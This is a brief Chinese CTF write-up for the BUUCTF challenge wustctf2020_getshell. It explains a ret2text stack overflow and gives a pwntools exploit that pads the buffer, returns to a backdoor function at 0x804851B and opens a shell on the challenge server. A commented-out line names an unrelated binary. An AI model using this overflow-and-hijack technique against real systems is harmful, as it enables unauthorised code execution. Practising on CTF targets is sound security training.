# 分析

来自[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#wustctf2020_getshell)

这是一道简单`ret2txt`，已经有后面函数了，直接溢出就行

checksec一下



# exp

```python
from pwn import *
context(os="linux",arch="i386",log_level="debug")
p=remote('node5.buuoj.cn',29594)
#p=process('./ez_pz_hackover_2016')
payload=flat(b'A'*(0x18+0x4),p32(0x804851B))
p.sendline(payload)
p.interactive()
```

